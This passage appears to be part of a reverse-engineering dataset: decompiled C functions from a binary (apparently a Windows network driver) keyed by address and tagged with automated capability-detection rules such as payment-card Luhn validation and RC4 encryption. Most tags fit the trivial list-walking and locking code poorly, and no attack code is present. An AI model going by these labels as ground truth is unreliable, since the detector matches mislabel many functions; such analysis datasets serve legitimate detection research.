    "00033d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00033d10(ulong arg1)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    uchar auStackX16 [8];\n    ulong auStackX24 [2];\n    \n    uVar2 = 0xc000000e;\n    fcn.00032650(0x7f8f0, auStackX16, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        auStackX24[0] = *(iVar1 + 0x20);\n    }\n    fcn.00032684(0x7f8f0, auStackX16, 0);\n    if (iVar1 == 0) {\n        uVar2 = 0xc000000e;\n    }\n    else {\n        fcn.0002fce4(auStackX24, 0xffffffff);\n        fcn.00032650(0x7f8f0, auStackX16, 0);\n        iVar1 = fcn.00032d34(arg1, 1);\n        if (iVar1 != 0) {\n            uVar2 = *(iVar1 + 0x28);\n        }\n        fcn.00032684(0x7f8f0, auStackX16, 0);\n        if (iVar1 == 0) {\n            uVar2 = 0xc000000e;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 323
    },
    "00034084": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00034084(ulong arg1, uint *arg2)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uchar auStackX16 [24];\n    \n    *arg2 = 0;\n    uVar2 = 0xc0000001;\n    fcn.00032650(0x7f8f0, auStackX16, 0);\n    iVar1 = fcn.00032d34(arg1, 1);\n    if (iVar1 != 0) {\n        uVar2 = 0;\n        *arg2 = *(iVar1 + 0x498);\n    }\n    fcn.00032684(0x7f8f0, auStackX16, 0);\n    return uVar2;\n}\n",
        "token_count": 168
    },
    "00034618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00034618(void)\n\n{\n    *0x7f908 = 0;\n    if (*0x7f958 != 0) {\n        fcn.000666f2();\n    }\n    if (*0x7f950 != 0) {\n        fcn.000666f2();\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "00036034": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00036034(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint in_stack_00000028;\n    ulong uStack120;\n    uchar auStack112 [16];\n    uchar auStack96 [16];\n    uint auStack80 [2];\n    ulong uStack72;\n    uchar *puStack64;\n    uint uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    \n    uStack120 = 0;\n    fcn.00066704(auStack112, arg1);\n    puStack64 = auStack112;\n    auStack80[0] = 0x30;\n    uStack72 = 0;\n    uStack56 = 0x140;\n    uStack48 = 0;\n    uStack40 = 0;\n    uVar2 = fcn.000666fe(&uStack120, 2, auStack80);\n    if (uVar2 == 0) {\n        fcn.00066704(auStack96, arg2);\n        uVar1 = fcn.000666f8(uStack120, auStack96, 0, in_stack_00000028, arg3, arg4);\n        uVar2 = uVar1;\n        fcn.000666f2(uStack120);\n    }\n    return uVar2;\n}\n",
        "token_count": 309
    },
    "00036358": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00036358(int64_t *arg1)\n\n{\n    int64_t arg1_00;\n    int64_t iVar1;\n    \n    if (arg1 != NULL) {\n        iVar1 = 0;\n        arg1_00 = *arg1;\n        while (arg1_00 != 0) {\n            fcn.00030d24(arg1_00);\n            iVar1 = iVar1 + 1;\n            arg1_00 = arg1[iVar1];\n        }\n        fcn.00030d24(arg1);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00036784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00036784(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    uchar uStack56;\n    uchar uStack55;\n    ushort uStack54;\n    uchar uStack52;\n    uchar uStack51;\n    ushort uStack50;\n    uint uStack48;\n    uint uStack44;\n    \n    uVar1 = fcn.00037170();\n    uVar4 = uVar1;\n    if (uVar1 == 0) {\n        fcn.0003ad40();\n        if (*0x7fec0 == uVar4) {\n            uStack56 = 0x80;\n            uStack55 = 1;\n            uStack54 = 0x10;\n            uStack52 = 0;\n            uStack50 = 0x10;\n            uStack48 = 0x6f6e624c;\n            uStack51 = 1;\n            uStack44 = 0x640;\n            *0x7fec0 = (**0x7fee0)(0, &uStack56);\n            if (*0x7fec0 == 0) {\n                uVar4 = 0xc0000001;\n            }\n            if (uVar4 != 0) {\n                return uVar4;\n            }\n        }\n        uVar1 = fcn.0003a250();\n        uVar4 = uVar1;\n        if (uVar1 == 0) {\n            iVar2 = fcn.0003ba44(*0x7e550);\n            iVar3 = fcn.0003d61c(*0x7e550);\n            uVar1 = fcn.0003acd0();\n            uVar4 = uVar1;\n            if (uVar1 == 0) {\n                if ((iVar2 == 0) && (iVar2 = fcn.0003bfd0(*0x7e550),  iVar2 == 0)) {\n                    iVar2 = fcn.0003814c(*0x7e550);\n                }\n                if (((iVar3 == 0) && (iVar3 = fcn.0003935c(*0x7e550),  iVar3 == 0)) || (iVar2 == 0)) {\n                    uVar4 = 0;\n                }\n                else {\n                    uVar4 = 0xc0000001;\n                }\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 539
    },
    "00036eb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00036eb8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    \n    iVar1 = fcn.000307e0();\n    LOCK();\n    bVar3 = *0x7fec8 == 0;\n    *0x7fec8 = *0x7fec8 ^ bVar3 * (*0x7fec8 ^ 1);\n    if (bVar3) {\n        fcn.0003434c();\n        iVar2 = fcn.00032ccc();\n        if (iVar2 == 0) {\n            fcn.0003690c();\n        }\n        fcn.00043118(fcn.0003350c);\n        if (iVar1 < 0x1b) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = fcn.00036784();\n        }\n        if ((iVar2 == 0) && (iVar2 = fcn.00046ad4(),  iVar2 == 0)) {\n            fcn.000354e4();\n            fcn.00049588();\n        }\n        if (0x1a < iVar1) {\n            fcn.00040b74();\n        }\n    }\n    else {\n        iVar2 = 0x21590006;\n    }\n    return iVar2;\n}\n",
        "token_count": 292
    },
    "00036f3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00036f3c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t arg1;\n    uchar auStack520 [512];\n    \n    arg1 = 0;\n    do {\n        iVar1 = fcn.00032e10(arg1, auStack520, 0x100);\n        if (iVar1 == 0) {\n            fcn.00036a3c(auStack520, L\"NDISPROT\");\n        }\n        uVar2 = arg1 + 1;\n        arg1 = uVar2;\n    } while (uVar2 < 100);\n    return;\n}\n",
        "token_count": 144
    },
    "00037170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00037170(void)\n\n{\n    int32_t iVar1;\n    ulong auStackX8 [4];\n    \n    iVar1 = fcn.00030a40(0x14780, auStackX8);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0004e130(auStackX8[0], 0x14760, 0x7fed0);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0004e130(auStackX8[0], 0x14748, 0x7fed8);\n            if (iVar1 == 0) {\n                iVar1 = fcn.0004e130(auStackX8[0], 0x14728, 0x7fee0);\n                if (iVar1 == 0) {\n                    iVar1 = fcn.0004e130(auStackX8[0], 0x14708, 0x7fee8);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.0004e130(auStackX8[0], 0x146e8, 0x7fef0);\n                        if (iVar1 == 0) {\n                            iVar1 = fcn.0004e130(auStackX8[0], 0x146d0, 0x7fef8);\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.0004e130(auStackX8[0], 0x146b8, 0x7ff00);\n                                if (iVar1 == 0) {\n                                    iVar1 = fcn.0004e130(auStackX8[0], 0x146a8, 0x7ff08);\n                                    if (iVar1 == 0) {\n                                        iVar1 = fcn.0004e130(auStackX8[0], 0x14690, 0x7ff10);\n                                        if (iVar1 == 0) {\n                                            iVar1 = fcn.0004e130(auStackX8[0], 0x14678, 0x7ff18);\n                                            if (iVar1 == 0) {\n                                                iVar1 = fcn.0004e130(auStackX8[0], 0x14660, 0x7ff20);\n                                                if (iVar1 == 0) {\n                                                    iVar1 = fcn.0004e130(auStackX8[0], 0x14650, 0x7ff28);\n                                                    if (iVar1 == 0) {\n                                                        iVar1 = fcn.0004e130(auStackX8[0], 0x14638, 0x7ff30);\n                                                        if (iVar1 == 0) {\n                                                            iVar1 = fcn.0004e130(auStackX8[0], 0x14618, 0x7ff38);\n                                                            if (iVar1 == 0) {\n                                                                iVar1 = fcn.0004e130(auStackX8[0], 0x145f0, 0x7ff40);\n                                                                if (iVar1 == 0) {\n                                                                    iVar1 = fcn.0004e130(auStackX8[0], 0x145d0, 0x7ff48)\n                                                                    ;\n                                                                    if (iVar1 == 0) {\n                                                                        iVar1 = fcn.0004e130(auStackX8[0], 0x145b0, \n                                                                                             0x7ff50);\n                                                                        if (iVar1 == 0) {\n                                                                            iVar1 = fcn.0004e130(auStackX8[0], 0x14590, \n                                                                                                 0x7ff58);\n                                                                            if (iVar1 == 0) {\n                                                                                iVar1 = fcn.0004e130(auStackX8[0], \n                                                                                                     0x14570, 0x7ff60);\n                                                                                if (iVar1 == 0) {\n                                                                                    iVar1 = fcn.0004e130(auStackX8[0], \n                                                                                                         0x14550, \n                                                            0x8e6b0);\n                                                            if (iVar1 == 0) {\n                                                                iVar1 = fcn.0004e130(auStackX8[0], 0x14530, 0x8e6e0);\n                                                                if (iVar1 == 0) {\n                                                                    iVar1 = fcn.0004e130(auStackX8[0], 0x14510, 0x8e6c8)\n                                                                    ;\n                                                                    if (iVar1 == 0) {\n                                                                        iVar1 = fcn.0004e130(auStackX8[0], 0x144f0, \n                                                                                             0x8e6e8);\n                                                                        if (iVar1 == 0) {\n                                                                            iVar1 = fcn.0004e130(auStackX8[0], 0x144d8, \n                                                                                                 0x8e6b8);\n                                                                            if (iVar1 == 0) {\n                                                                                iVar1 = fcn.0004e130(auStackX8[0], \n                                                                                                     0x144c0, 0x8e6c0);\n                                                                                if (iVar1 == 0) {\n                                                                                    iVar1 = fcn.0004e130(auStackX8[0], \n                                                                                                         0x144a0, \n                                                            0x8e6d8);\n                                                            if (iVar1 == 0) {\n                                                                iVar1 = fcn.0004e130(auStackX8[0], 0x14480, 0x8e6d0);\n                                                                if (iVar1 == 0) {\n                                                                    fcn.0004e130(auStackX8[0], 0x144c0, 0x8e6c0);\n                                                                }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1345
    },
    "000374fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000374fc(void)\n\n{\n    int32_t iVar1;\n    ulong auStackX8 [4];\n    \n    iVar1 = fcn.00030a40(0x14a38, auStackX8);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0004e130(auStackX8[0], 0x14a18, 0x7ff68);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0004e130(auStackX8[0], 0x149f8, 0x7ff70);\n            if (iVar1 == 0) {\n                iVar1 = fcn.0004e130(auStackX8[0], 0x149e0, 0x7ff78);\n                if (iVar1 == 0) {\n                    iVar1 = fcn.0004e130(auStackX8[0], 0x149c8, 0x7ff80);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.0004e130(auStackX8[0], 0x149b0, 0x7ff88);\n                        if (iVar1 == 0) {\n                            iVar1 = fcn.0004e130(auStackX8[0], 0x14998, 0x7ff90);\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.0004e130(auStackX8[0], 0x14988, 0x7ff98);\n                                if (iVar1 == 0) {\n                                    iVar1 = fcn.0004e130(auStackX8[0], 0x14968, 0x7ffa0);\n                                    if (iVar1 == 0) {\n                                        iVar1 = fcn.0004e130(auStackX8[0], 0x14948, 0x7ffa8);\n                                        if (iVar1 == 0) {\n                                            iVar1 = fcn.0004e130(auStackX8[0], 0x14938, 0x7ffb0);\n                                            if (iVar1 == 0) {\n                                                iVar1 = fcn.0004e130(auStackX8[0], 0x14920, 0x7ffb8);\n                                                if (iVar1 == 0) {\n                                                    iVar1 = fcn.0004e130(auStackX8[0], 0x14908, 0x7ffc0);\n                                                    if (iVar1 == 0) {\n                                                        iVar1 = fcn.0004e130(auStackX8[0], 0x148f8, 0x7ffc8);\n                                                        if (iVar1 == 0) {\n                                                            iVar1 = fcn.0004e130(auStackX8[0], 0x148e0, 0x7ffd0);\n                                                            if (iVar1 == 0) {\n                                                                iVar1 = fcn.0004e130(auStackX8[0], 0x148c0, 0x7ffd8);\n                                                                if (iVar1 == 0) {\n                                                                    iVar1 = fcn.0004e130(auStackX8[0], 0x148a0, 0x7ffe0)\n                                                                    ;\n                                                                    if (iVar1 == 0) {\n                                                                        iVar1 = fcn.0004e130(auStackX8[0], 0x14888, \n                                                                                             0x7ffe8);\n                                                                        if (iVar1 == 0) {\n                                                                            iVar1 = fcn.0004e130(auStackX8[0], 0x14870, \n                                                                                                 0x7fff0);\n                                                                            if (iVar1 == 0) {\n                                                                                iVar1 = fcn.0004e130(auStackX8[0], \n                                                                                                     0x14848, 0x7fff8);\n                                                                                if (iVar1 == 0) {\n                                                                                    iVar1 = fcn.0004e130(auStackX8[0], \n                                                                                                         0x14828, \n                                                            0x8e690);\n                                                            if (iVar1 == 0) {\n                                                                iVar1 = fcn.0004e130(auStackX8[0], 0x14818, 0x8e680);\n                                                                if (iVar1 == 0) {\n                                                                    iVar1 = fcn.0004e130(auStackX8[0], 0x147f8, 0x8e688)\n                                                                    ;\n                                                                    if (iVar1 == 0) {\n                                                                        iVar1 = fcn.0004e130(auStackX8[0], 0x147d8, \n                                                                                             0x8e698);\n                                                                        if (iVar1 == 0) {\n                                                                            iVar1 = fcn.0004e130(auStackX8[0], 0x147b8, \n                                                                                                 0x8e6a8);\n                                                                            if (iVar1 == 0) {\n                                                                                iVar1 = fcn.0004e130(auStackX8[0], \n                                                                                                     0x147a0, 0x8e6a0);\n                                                                                if (iVar1 == 0) {\n                                                                                    iVar1 = fcn.0004e130(auStackX8[0], \n                                                                                                         0x148c0, \n                                                            0x7ffd8);\n                                                            if (iVar1 == 0) {\n                                                                fcn.0004e130(auStackX8[0], 0x14790, 0x8e678);\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1290
    },
    "00037868": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.00037868(int64_t arg1, ulong *arg2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    ulong *puVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    ulong *arg1_00;\n    ulong *puVar6;\n    uchar auStackX8 [32];\n    \n    uVar1 = *(arg1 + 2);\n    uVar2 = *(arg1 + 3);\n    *arg2 = 0;\n    iVar5 = uVar2 + uVar1 & 0xf;\n    fcn.00032650(0x8e5e0, auStackX8, 1);\n    puVar3 = *(iVar5 * 8 + 0x8e5f8);\n    puVar6 = NULL;\n    do {\n        arg1_00 = puVar3;\n        if (arg1_00 == NULL) {\ncode_r0x000378eb:\n            fcn.00032684(0x8e5e0, auStackX8, 1);\n            if (arg1_00 == NULL) {\n                uVar4 = 0xc0000001;\n            }\n            else {\n                fcn.00030d24(arg1_00);\n                uVar4 = 0;\n            }\n            return uVar4;\n        }\n        if (arg1_00[1] == arg1) {\n            if (puVar6 == NULL) {\n                *(iVar5 * 8 + 0x8e5f8) = *arg1_00;\n            }\n            else {\n                *puVar6 = *arg1_00;\n            }\n            *arg2 = arg1_00[2];\n            goto code_r0x000378eb;\n        }\n        puVar3 = *arg1_00;\n        puVar6 = arg1_00;\n    } while( true );\n}\n",
        "token_count": 416
    },
    "00037bdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.00037bdc(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    puVar1 = *0x80030;\n    if (arg2 == 0) {\n        fcn.00032650(0x80038, auStackX24, 0);\n        puVar1 = *0x80030;\n    }\n    for (; (puVar1 != NULL && (puVar1[3] != arg1)); puVar1 = *puVar1) {\n    }\n    if (arg2 == 0) {\n        fcn.00032684(0x80038, auStackX24, 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 166
    },
    "00037ca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00037ca0(int64_t *arg1)\n\n{\n    int64_t **ppiVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t **ppiVar4;\n    int64_t **ppiVar5;\n    int64_t **ppiVar6;\n    uchar auStackX8 [32];\n    \n    ppiVar6 = NULL;\n    ppiVar4 = NULL;\n    if (arg1 == NULL) {\n        uVar3 = 0xc00000ef;\n    }\n    else {\n        fcn.00032650(0x80038, auStackX8, 0);\n        ppiVar5 = *0x80030;\n        if (*0x80030 != NULL) {\n            do {\n                if (ppiVar5[3] == arg1) break;\n                ppiVar5 = *ppiVar5;\n            } while (ppiVar5 != NULL);\n            if (ppiVar5 != NULL) {\n                ppiVar6 = ppiVar5 + 6;\n                ppiVar4 = ppiVar5 + 5;\n            }\n        }\n        fcn.00032684(0x80038, auStackX8, 0);\n        if (ppiVar5 == NULL) {\n            uVar3 = 0xc000000d;\n        }\n        else {\n            iVar2 = fcn.0005540c(ppiVar4);\n            if (iVar2 == 0) {\n                fcn.0005540c(ppiVar6);\n            }\n            fcn.00032650(0x80038, auStackX8, 0);\n            ppiVar4 = NULL;\n            ppiVar5 = *0x80030;\n            ppiVar6 = *0x80030;\n            ppiVar1 = *0x80030;\n            if (*0x80030 != NULL) {\n                do {\n                    ppiVar6 = ppiVar5;\n                    if (ppiVar5[3] == arg1) break;\n                    ppiVar6 = *ppiVar5;\n                    ppiVar4 = ppiVar5;\n                    ppiVar5 = ppiVar6;\n                } while (ppiVar6 != NULL);\n                if ((ppiVar6 != NULL) && (ppiVar1 = *ppiVar6,  ppiVar4 != NULL)) {\n                    *ppiVar4 = *ppiVar6;\n                    ppiVar1 = *0x80030;\n                }\n            }\n            *0x80030 = ppiVar1;\n            fcn.00032684(0x80038, auStackX8, 0);\n            fcn.00030d24(ppiVar6);\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 598
    },
    "00037da4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00037da4(int64_t *arg1)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    ulong uVar2;\n    ulong unaff_RBX;\n    int64_t **ppiVar3;\n    int64_t **ppiVar4;\n    ulong unaff_RBP;\n    int64_t **arg3;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    int64_t **arg3_00;\n    ulong in_R9;\n    ulong unaff_R12;\n    bool bVar5;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    \n    arg3 = NULL;\n    fcn.00032650(0x80038, &stack0x00000008, 0);\n    LOCK();\n    bVar5 = *0x7fec8 == 0;\n    *0x7fec8 = *0x7fec8 ^ bVar5 * *0x7fec8;\n    ppiVar3 = *0x80030;\n    ppiVar4 = arg3;\n    arg3_00 = arg3;\n    if (!bVar5) {\n        for (; (ppiVar3 != NULL && (ppiVar3[3] != arg1)); ppiVar3 = *ppiVar3) {\n        }\n        ppiVar4 = ppiVar3;\n        if (ppiVar3 != NULL) {\n            arg3_00 = ppiVar3 + 6;\n            arg3 = ppiVar3 + 5;\n        }\n    }\n    fcn.00032684(0x80038, &stack0x00000008, 0);\n    if (ppiVar4 == NULL) {\n        return 0xc000000d;\n    }\n    if ((*arg3_00 == NULL) && (*arg3 == NULL)) {\n        if (arg1[9] == 0) {\n            return 0xc0000001;\n        }\n        arg1_00 = *(*0x801d4 + arg1[9]);\n        if ((arg1_00 != 0) &&\n           (uVar2 = fcn.000550f0(arg1_00, 0x37920, arg3_00, in_R9, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX\n                                 , in_stack_00000000, in_stack_00000008, in_stack_00000010, in_stack_00000018, \n                                 in_stack_00000020, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                                 in_stack_00000040, in_stack_00000048, in_stack_00000050, in_stack_00000058, \n                                 in_stack_00000060, in_stack_00000068, in_stack_00000070, in_stack_00000078), \n           uVar2 != 0)) {\n            return uVar2;\n        }\n        iVar1 = fcn.000550f0(*(*0x8e4a8 + arg1), 0x37994, arg3, in_R9, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, \n                             unaff_RBX, in_stack_00000000, in_stack_00000008, in_stack_00000010, in_stack_00000018, \n                             in_stack_00000020, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                             in_stack_00000040, in_stack_00000048, in_stack_00000050, in_stack_00000058, \n                             in_stack_00000060, in_stack_00000068, in_stack_00000070, in_stack_00000078);\n        if (iVar1 != 0) {\n            fcn.0005540c(arg3_00);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 992
    },
    "000383a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000383a4(void)\n\n{\n    if (*0x800f0 != 0) {\n        (**0x7fee8)();\n    }\n    *0x800f0 = 0;\n    return;\n}\n",
        "token_count": 50
    },
    "000383cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.000383cc(int64_t arg1, int64_t arg2, ulong *arg3)\n\n{\n    ulong uVar1;\n    ulong *puVar2;\n    int64_t iVar3;\n    ulong *arg1_00;\n    uchar auStackX8 [32];\n    \n    iVar3 = *(arg1 + 3) + *(arg1 + 2) & 0xf;\n    fcn.00032650(0x8e540, auStackX8, 1);\n    puVar2 = NULL;\n    arg1_00 = *(iVar3 * 8 + 0x8e558);\n    do {\n        if (arg1_00 == NULL) {\ncode_r0x00038451:\n            fcn.00032684(0x8e540, auStackX8, 1);\n            if (arg1_00 == NULL) {\n                uVar1 = 0xc0000001;\n            }\n            else {\n                fcn.00030d24(arg1_00);\n                uVar1 = 0;\n            }\n            return uVar1;\n        }\n        if ((arg1_00[2] == arg1) && (arg1_00[1] == arg2)) {\n            if (puVar2 == NULL) {\n                *(iVar3 * 8 + 0x8e558) = *arg1_00;\n            }\n            else {\n                *puVar2 = *arg1_00;\n            }\n            *arg3 = arg1_00[3];\n            goto code_r0x00038451;\n        }\n        puVar2 = arg1_00;\n        arg1_00 = *arg1_00;\n    } while( true );\n}\n",
        "token_count": 372
    },
    "00038488": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.00038488(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    puVar1 = *0x800c0;\n    if (arg2 == 0) {\n        fcn.00032650(0x800a0, auStackX24, 0);\n        puVar1 = *0x800c0;\n    }\n    for (; (puVar1 != NULL && (puVar1[6] != arg1)); puVar1 = *puVar1) {\n    }\n    if (arg2 == 0) {\n        fcn.00032684(0x800a0, auStackX24, 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 169
    },
    "000384e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.000384e8(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    puVar1 = *0x800c0;\n    if (arg2 == 0) {\n        fcn.00032650(0x800a0, auStackX24, 0);\n        puVar1 = *0x800c0;\n    }\n    for (; (puVar1 != NULL && (puVar1[5] != arg1)); puVar1 = *puVar1) {\n    }\n    if (arg2 == 0) {\n        fcn.00032684(0x800a0, auStackX24, 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 170
    },
    "00038a18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00038a18(ulong arg1, ulong arg2, int64_t arg3)\n\n{\n    ulong *arg1_00;\n    int32_t iVar1;\n    int64_t *piVar2;\n    uchar auStackX32 [8];\n    \n    arg1_00 = fcn.00030cc4(0x38);\n    if (arg1_00 == NULL) {\n        return -0x3fffff66;\n    }\n    fcn.0006677c(arg1_00);\n    arg1_00[6] = arg2;\n    arg1_00[5] = arg1;\n    arg1_00[4] = arg3;\n    fcn.00032650(0x800a0, auStackX32, 1);\n    piVar2 = *0x800b8;\n    if (*0x800b8 != NULL) {\n        do {\n            if (piVar2[1] == arg3) break;\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n        if (piVar2 != NULL) {\n            arg1_00[1] = piVar2;\n            iVar1 = 0;\n            *arg1_00 = *0x800c0;\n            *0x800c0 = arg1_00;\n            goto code_r0x00038ab6;\n        }\n    }\n    iVar1 = -0x3fffff0f;\ncode_r0x00038ab6:\n    fcn.00032684(0x800a0, auStackX32, 1);\n    if (iVar1 != 0) {\n        fcn.00030d24(arg1_00);\n    }\n    return iVar1;\n}\n",
        "token_count": 382
    },
    "00038ae4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00038ae4(int64_t *arg1)\n\n{\n    int64_t **ppiVar1;\n    int64_t **ppiVar2;\n    int64_t arg1_00;\n    int64_t **ppiVar3;\n    int64_t **ppiVar4;\n    ulong *puVar5;\n    int64_t *piStackX16;\n    int64_t *piStackX24;\n    int64_t *piStackX32;\n    int64_t *piStack56;\n    uchar auStack48 [8];\n    uchar auStack40 [16];\n    \n    do {\n        arg1_00 = 0;\n        fcn.00032650(0x800a0, &piStackX16, 0);\n        for (puVar5 = *0x800c0; puVar5 != NULL; puVar5 = *puVar5) {\n            if (puVar5[4] == arg1) {\n                arg1_00 = puVar5[5];\n                break;\n            }\n        }\n        fcn.00032684(0x800a0, &piStackX16, 0);\n        if (arg1_00 == 0) break;\n        fcn.00038974(arg1_00);\n    } while( true );\n    piStackX16 = NULL;\n    piStackX24 = NULL;\n    piStackX32 = NULL;\n    piStack56 = NULL;\n    fcn.00032650(0x800a0, auStack48, 1);\n    ppiVar4 = *0x800b8;\n    if (*0x800b8 != NULL) {\n        do {\n            if (ppiVar4[1] == arg1) break;\n            ppiVar4 = *ppiVar4;\n        } while (ppiVar4 != NULL);\n        if (ppiVar4 != NULL) {\n            piStackX16 = ppiVar4[3];\n            piStackX24 = ppiVar4[4];\n            piStackX32 = ppiVar4[6];\n            piStack56 = ppiVar4[5];\n            ppiVar4[6] = NULL;\n            ppiVar4[5] = NULL;\n            ppiVar4[3] = NULL;\n            ppiVar4[4] = NULL;\n        }\n    }\n    fcn.00032684(0x800a0, auStack48, 1);\n    fcn.0005540c(&piStackX16);\n    fcn.0005540c(&piStackX24);\n    fcn.0005540c(&piStackX32);\n    fcn.0005540c(&piStack56);\n    fcn.00032650(0x800a0, auStack40, 0);\n    ppiVar2 = NULL;\n    ppiVar3 = *0x800b8;\n    ppiVar4 = *0x800b8;\n    ppiVar1 = *0x800b8;\n    if (*0x800b8 != NULL) {\n        do {\n            ppiVar4 = ppiVar3;\n            if (ppiVar3[1] == arg1) break;\n            ppiVar4 = *ppiVar3;\n            ppiVar2 = ppiVar3;\n            ppiVar3 = ppiVar4;\n        } while (ppiVar4 != NULL);\n        if ((ppiVar4 != NULL) && (ppiVar1 